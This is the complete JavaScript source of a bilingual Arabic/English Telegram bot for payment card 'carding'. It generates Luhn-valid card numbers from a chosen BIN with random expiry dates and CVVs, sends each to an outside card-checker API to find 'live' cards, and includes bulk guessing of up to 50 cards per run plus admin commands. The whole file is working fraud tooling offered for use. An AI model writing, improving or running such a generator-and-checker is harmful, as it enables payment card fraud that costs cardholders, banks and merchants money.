const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

// ==========================================
// التوكن من متغيرات البيئة
// ==========================================
const TOKEN = process.env.TOKEN;
if (!TOKEN) {
    console.error('❌ الرجاء تعيين متغير البيئة TOKEN');
    process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });

// ==========================================
// المتغيرات العامة
// ==========================================
const userLang = new Map();                // chatId -> 'ar'/'en'
const adminSet = new Set([643309456]);    // الأدمن الأساسي (رقم معرف المستخدم)
const guessState = new Map();              // chatId -> { bin, count, cancelFlag }

// ==========================================
// الترجمات (عربي + إنجليزي)
// ==========================================
const t = {
    ar: {
        choose_lang: 'اختر لغتك / Choose your language:',
        lang_changed: '✅ تم تغيير اللغة إلى العربية',
        main_menu: '✨ *القائمة الرئيسية* ✨\nاختر أحد الخيارين:',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        cancel_btn: '❌ إلغاء',
        enter_bin: '📌 أرسل أول 6 أرقام من الفيزا (BIN) مثال: `515462`',
        invalid_bin: '⚠️ يجب إرسال 6 أرقام فقط (BIN).',
        enter_count: '🔢 كم عدد الفيزات التي تريد تخمينها؟\n(الحد الأدنى 5، الحد الأقصى 50)',
        count_out_of_range: '⚠️ العدد يجب أن يكون بين 5 و 50.',
        count_exceed_admin: '⚠️ العدد المطلوب يتجاوز الحد المسموح (الأدمن فقط يمكنه تجاوز 50).',
        cancel_msg: '❌ تم إلغاء العملية.',
        guessing_start: '🚀 بدء تخمين {count} فيزا... سيتم عرض النتائج فور ظهورها.',
        generating: '🔄 جاري إنشاء الفيزا {current}/{total}...',
        checking: '⏳ جاري فحص البطاقة...',
        live_result: '✅ **بطاقة صالحة**\n━━━━━━━━━━━━━━\n💳 `{card}`\n📊 الحالة: {status}\n💬 الرسالة: {msg}\n🏦 النوع: {type}\n🌍 البلد: {country}\n━━━━━━━━━━━━━━',
        dead_result: '❌ **بطاقة مرفوضة**\n━━━━━━━━━━━━━━\n💳 `{card}`\n📊 الحالة: {status}\n💬 الرسالة: {msg}\n━━━━━━━━━━━━━━',
        summary: '📊 *الملخص النهائي*\n✅ الصالحة: {hit}\n❌ المرفوضة: {bad}\n🎯 المجموع: {total}',
        single_invalid: '⚠️ الصيغة غير صحيحة.\nأرسل البطاقة بهذا الشكل:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ جاري فحص البطاقة...',
        single_luhn_fail: '❌ رقم البطاقة غير صالح (فشل Luhn).',
        api_error: '⚠️ حدث خطأ أثناء الاتصال بالخدمة. حاول لاحقاً.',
        unknown: 'غير معروف',
        not_admin: '⛔ هذا الأمر مخصص للأدمن فقط.',
        admin_added: '✅ تم إضافة أدمن جديد: `{id}`',
        admin_removed: '✅ تم إزالة الأدمن: `{id}`',
        admin_list: '📋 قائمة الأدمن:\n{list}',
        help_admin: '🔧 أوامر الأدمن:\n/addadmin <id>\n/removeadmin <id>\n/admins'
    },
    en: {
        choose_lang: 'Choose your language / اختر لغتك:',
        lang_changed: '✅ Language changed to English',
        main_menu: '✨ *Main Menu* ✨\nChoose an option:',
        btn_guess: '🎲 Guess multiple cards',
        btn_single: '🔍 Check single card',
        cancel_btn: '❌ Cancel',
        enter_bin: '📌 Send the first 6 digits of the card (BIN) e.g. `515462`',
        invalid_bin: '⚠️ You must send exactly 6 digits (BIN).',
        enter_count: '🔢 How many cards to guess?\n(Min 5, Max 50)',
        count_out_of_range: '⚠️ Count must be between 5 and 50.',
        count_exceed_admin: '⚠️ Requested count exceeds limit (only admin can exceed 50).',
        cancel_msg: '❌ Operation cancelled.',
        guessing_start: '🚀 Starting guess of {count} cards... Results will appear as they come.',
        generating: '🔄 Generating card {current}/{total}...',
        checking: '⏳ Checking card...',
        live_result: '✅ **Card is LIVE**\n━━━━━━━━━━━━━━\n💳 `{card}`\n📊 Status: {status}\n💬 Message: {msg}\n🏦 Type: {type}\n🌍 Country: {country}\n━━━━━━━━━━━━━━',
        dead_result: '❌ **Card is DECLINED**\n━━━━━━━━━━━━━━\n💳 `{card}`\n📊 Status: {status}\n💬 Message: {msg}\n━━━━━━━━━━━━━━',
        summary: '📊 *Final Summary*\n✅ Live: {hit}\n❌ Declined: {bad}\n🎯 Total: {total}',
        single_invalid: '⚠️ Invalid format.\nSend the card like:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ Checking card...',
        single_luhn_fail: '❌ Invalid card number (Luhn check failed).',
        api_error: '⚠️ API error. Please try again later.',
        unknown: 'Unknown',
        not_admin: '⛔ This command is for admins only.',
        admin_added: '✅ New admin added: `{id}`',
        admin_removed: '✅ Admin removed: `{id}`',
        admin_list: '📋 Admin list:\n{list}',
        help_admin: '🔧 Admin commands:\n/addadmin <id>\n/removeadmin <id>\n/admins'
    }
};

// ==========================================
// دوال مساعدة (Luhn, توليد تاريخ عشوائي, CVV, إلخ)
// ==========================================
function checkLuhn(cardNumber) {
    let sum = 0, alt = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);
        if (alt) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        alt = !alt;
    }
    return sum % 10 === 0;
}

function generateRandomMonth() {
    return String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
}

function generateRandomYear() {
    const currentYear = new Date().getFullYear();
    const minYear = currentYear;
    const maxYear = currentYear + 5;
    return String(Math.floor(Math.random() * (maxYear - minYear + 1)) + minYear);
}

function generateRandomCVV() {
    return String(Math.floor(Math.random() * 900) + 100);
}

function generateCardNumber(bin, length = 16) {
    // bin قد يكون أقل من 6 أرقام أو أكثر (لكننا نأخذ أول 6 كما هي)
    let card = bin;
    while (card.length < length - 1) {
        card += Math.floor(Math.random() * 10);
    }
    // إضافة الرقم الأخير لتحقيق Luhn
    for (let i = 0; i <= 9; i++) {
        const testCard = card + i;
        if (checkLuhn(testCard)) {
            return testCard;
        }
    }
    return card + '0'; // fallback
}

function generateFullVisa(bin) {
    const cardNumber = generateCardNumber(bin);
    const month = generateRandomMonth();
    const year = generateRandomYear();
    const cvv = generateRandomCVV();
    return `${cardNumber}|${month}|${year}|${cvv}`;
}

// ==========================================
// دالة فحص بطاقة واحدة عبر API
// ==========================================
async function checkSingleCard(cardString, chatId, isSilent = false) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = t[lang];

    const parts = cardString.split('|');
    if (parts.length >= 1) {
        const cardNum = parts[0];
        if (!checkLuhn(cardNum)) {
            if (!isSilent) await bot.sendMessage(chatId, dict.single_luhn_fail);
            return null;
        }
    }

    const url = 'https://api.chkr.cc/';
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/json'
    };
    const payload = { data: cardString };

    try {
        const response = await axios.post(url, payload, { headers, timeout: 10000 });
        const data = response.data;
        const code = data.code;
        const status = data.status || dict.unknown;
        const msg = data.message || dict.unknown;
        const cardInfo = data.card || {};
        const cardType = cardInfo.type || dict.unknown;
        const country = (cardInfo.country && cardInfo.country.name) || dict.unknown;
        const isLive = (code === 1);
        return { isLive, status, message: msg, type: cardType, country };
    } catch (err) {
        console.error(err);
        if (!isSilent) await bot.sendMessage(chatId, dict.api_error);
        return null;
    }
}

// ==========================================
// دالة التخمين الجماعي
// ==========================================
async function startGuessing(chatId, bin, requestedCount) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = t[lang];
    const isAdmin = adminSet.has(chatId);
    let total = requestedCount;

    if (!isAdmin && total > 50) {
        await bot.sendMessage(chatId, dict.count_exceed_admin);
        return;
    }
    if (total < 5) total = 5;
    if (total > 50 && !isAdmin) total = 50;

    // تخزين حالة الإلغاء
    const state = guessState.get(chatId);
    if (state && state.cancelFlag) {
        guessState.delete(chatId);
    }
    guessState.set(chatId, { bin, count: total, cancelFlag: false });

    await bot.sendMessage(chatId, dict.guessing_start.replace('{count}', total));

    let hit = 0, bad = 0;
    for (let i = 1; i <= total; i++) {
        // التحقق من الإلغاء
        const currentState = guessState.get(chatId);
        if (currentState && currentState.cancelFlag) {
            await bot.sendMessage(chatId, dict.cancel_msg);
            guessState.delete(chatId);
            return;
        }

        // رسالة التقدم
        const progressMsg = await bot.sendMessage(chatId, dict.generating.replace('{current}', i).replace('{total}', total));

        // توليد فيزا عشوائية
        const fullVisa = generateFullVisa(bin);
        // فحصها
        const result = await checkSingleCard(fullVisa, chatId, true);
        if (result) {
            if (result.isLive) {
                hit++;
                const liveText = dict.live_result
                    .replace('{card}', fullVisa)
                    .replace('{status}', result.status)
                    .replace('{msg}', result.message)
                    .replace('{type}', result.type)
                    .replace('{country}', result.country);
                await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown' });
            } else {
                bad++;
                const deadText = dict.dead_result
                    .replace('{card}', fullVisa)
                    .replace('{status}', result.status)
                    .replace('{msg}', result.message);
                await bot.sendMessage(chatId, deadText, { parse_mode: 'Markdown' });
            }
        } else {
            // فشل الاتصال أو Luhn - نعتبرها bad
            bad++;
        }

        // حذف رسالة التقدم لتجنب الفوضى
        bot.deleteMessage(chatId, progressMsg.message_id).catch(() => {});
    }

    // إرسال الملخص
    const summaryText = dict.summary.replace('{hit}', hit).replace('{bad}', bad).replace('{total}', total);
    await bot.sendMessage(chatId, summaryText, { parse_mode: 'Markdown' });

    guessState.delete(chatId);
}

// ==========================================
// أوامر الأدمن
// ==========================================
bot.onText(/\/addadmin (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!adminSet.has(chatId)) {
        bot.sendMessage(chatId, t[userLang.get(chatId) || 'ar'].not_admin);
        return;
    }
    const newAdminId = parseInt(match[1].trim(), 10);
    if (isNaN(newAdminId)) {
        bot.sendMessage(chatId, '⚠️ ID غير صالح.');
        return;
    }
    adminSet.add(newAdminId);
    const dict = t[userLang.get(chatId) || 'ar'];
    bot.sendMessage(chatId, dict.admin_added.replace('{id}', newAdminId));
});

bot.onText(/\/removeadmin (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!adminSet.has(chatId)) {
        bot.sendMessage(chatId, t[userLang.get(chatId) || 'ar'].not_admin);
        return;
    }
    const adminId = parseInt(match[1].trim(), 10);
    if (adminId === 643309456) {
        bot.sendMessage(chatId, '⚠️ لا يمكن إزالة الأدمن الأساسي.');
        return;
    }
    adminSet.delete(adminId);
    const dict = t[userLang.get(chatId) || 'ar'];
    bot.sendMessage(chatId, dict.admin_removed.replace('{id}', adminId));
});

bot.onText(/\/admins/, (msg) => {
    const chatId = msg.chat.id;
    if (!adminSet.has(chatId)) {
        bot.sendMessage(chatId, t[userLang.get(chatId) || 'ar'].not_admin);
        return;
    }
    const list = Array.from(adminSet).join('\n');
    const dict = t[userLang.get(chatId) || 'ar'];
    bot.sendMessage(chatId, dict.admin_list.replace('{list}', list));
});

// ==========================================
// أمر /cancel لإلغاء التخمين
// ==========================================
bot.onText(/\/cancel/, (msg) => {
    const chatId = msg.chat.id;
    const state = guessState.get(chatId);
    if (state) {
        state.cancelFlag = true;
        bot.sendMessage(chatId, t[userLang.get(chatId) || 'ar'].cancel_msg);
    } else {
        bot.sendMessage(chatId, '⚠️ لا توجد عملية نشطة.');
    }
});

// ==========================================
// القائمة الرئيسية (تظهر بعد /start أو /menu)
// ==========================================
async function showMainMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = t[lang];
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.btn_guess, callback_data: 'menu_guess' }],
                [{ text: dict.btn_single, callback_data: 'menu_single' }]
            ]
        },
        parse_mode: 'Markdown'
    };
    await bot.sendMessage(chatId, dict.main_menu, opts);
}

// أمر /start و /menu
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'العربية', callback_data: 'lang_ar' }, { text: 'English', callback_data: 'lang_en' }]
            ]
        }
    };
    bot.sendMessage(chatId, t.ar.choose_lang, opts);
});

bot.onText(/\/menu/, (msg) => {
    showMainMenu(msg.chat.id);
});

// ==========================================
// معالجة الأزرار (اختيار اللغة + القائمة)
// ==========================================
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    bot.answerCallbackQuery(query.id);

    if (data === 'lang_ar') {
        userLang.set(chatId, 'ar');
        await bot.sendMessage(chatId, t.ar.lang_changed + '\n\n' + t.ar.main_menu, { parse_mode: 'Markdown' });
        await showMainMenu(chatId);
    } else if (data === 'lang_en') {
        userLang.set(chatId, 'en');
        await bot.sendMessage(chatId, t.en.lang_changed + '\n\n' + t.en.main_menu, { parse_mode: 'Markdown' });
        await showMainMenu(chatId);
    } else if (data === 'menu_guess') {
        // بدء عملية التخمين: طلب BIN
        await bot.sendMessage(chatId, t[userLang.get(chatId) || 'ar'].enter_bin, { parse_mode: 'Markdown' });
        // ننتظر رسالة تحتوي على BIN
        // سيتم التعامل معها في معالج الرسائل النصية حسب الحالة
    } else if (data === 'menu_single') {
        // إعلام المستخدم بأنه يمكنه إرسال فيزا واحدة
        const lang = userLang.get(chatId) || 'ar';
        await bot.sendMessage(chatId, t[lang].single_invalid, { parse_mode: 'Markdown' });
    }
});

// ==========================================
// معالجة الرسائل النصية (BIN, العدد, أو فيزا واحدة)
// ==========================================
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text.startsWith('/')) return;

    const lang = userLang.get(chatId) || 'ar';
    const dict = t[lang];

    // 1) هل المستخدم في مرحلة انتظار BIN؟
    const state = guessState.get(chatId);
    if (state && !state.bin) {
        // ننتظر BIN
        if (/^\d{6}$/.test(text.trim())) {
            state.bin = text.trim();
            // نطلب العدد
            const cancelKeyboard = {
                reply_markup: {
                    inline_keyboard: [[{ text: dict.cancel_btn, callback_data: 'cancel_guess' }]]
                }
            };
            await bot.sendMessage(chatId, dict.enter_count, cancelKeyboard);
        } else {
            await bot.sendMessage(chatId, dict.invalid_bin);
        }
        return;
    }

    // 2) هل المستخدم في مرحلة انتظار العدد؟
    if (state && state.bin && !state.count) {
        const count = parseInt(text.trim(), 10);
        if (isNaN(count)) {
            await bot.sendMessage(chatId, dict.enter_count);
            return;
        }
        const isAdmin = adminSet.has(chatId);
        if (!isAdmin && (count < 5 || count > 50)) {
            await bot.sendMessage(chatId, dict.count_out_of_range);
            return;
        }
        if (!isAdmin && count > 50) {
            await bot.sendMessage(chatId, dict.count_exceed_admin);
            return;
        }
        state.count = count;
        // بدء التخمين
        await startGuessing(chatId, state.bin, count);
        return;
    }

    // 3) لا توجد حالة تخمين -> نعتبره فحص فيزا واحدة
    if (text.split('|').length < 4) {
        await bot.sendMessage(chatId, dict.single_invalid, { parse_mode: 'Markdown' });
        return;
    }

    await bot.sendMessage(chatId, dict.single_checking);
    const result = await checkSingleCard(text, chatId);
    if (!result) return;

    let resultText;
    if (result.isLive) {
        resultText = dict.live_result
            .replace('{card}', text)
            .replace('{status}', result.status)
            .replace('{msg}', result.message)
            .replace('{type}', result.type)
            .replace('{country}', result.country);
    } else {
        resultText = dict.dead_result
            .replace('{card}', text)
            .replace('{status}', result.status)
            .replace('{msg}', result.message);
    }
    await bot.sendMessage(chatId, resultText, { parse_mode: 'Markdown' });
});

// إضافة معالج إلغاء من الكيبورد
bot.on('callback_query', async (query) => {
    if (query.data === 'cancel_guess') {
        const chatId = query.message.chat.id;
        const state = guessState.get(chatId);
        if (state) {
            state.cancelFlag = true;
            await bot.sendMessage(chatId, t[userLang.get(chatId) || 'ar'].cancel_msg);
            guessState.delete(chatId);
        }
        bot.answerCallbackQuery(query.id);
    }
});

console.log('✅ البوت يعمل الآن مع وضع التخمين الجماعي وإدارة الأدمن...');
